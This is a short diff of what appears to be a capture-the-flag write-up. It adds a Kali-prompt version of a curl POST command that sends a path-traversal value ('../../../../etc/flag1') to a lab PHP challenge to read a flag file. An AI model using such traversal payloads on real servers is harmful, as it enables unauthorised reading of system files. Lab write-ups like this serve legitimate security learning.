@@ -31,3 +31,5 @@ In this instance I will use Curl to generate the POST request and recive the fla
 
 <pre>curl http://MACHINE_IP/challenges/chall1.php -X POST -d "file=../../../../etc/flag1"</pre>
 
+
+<pre> ```bash kali@kali:~$ curl http://MACHINE_IP/challenges/chall1.php -X POST -d "file=../../../../etc/flag1" ``` </pre>
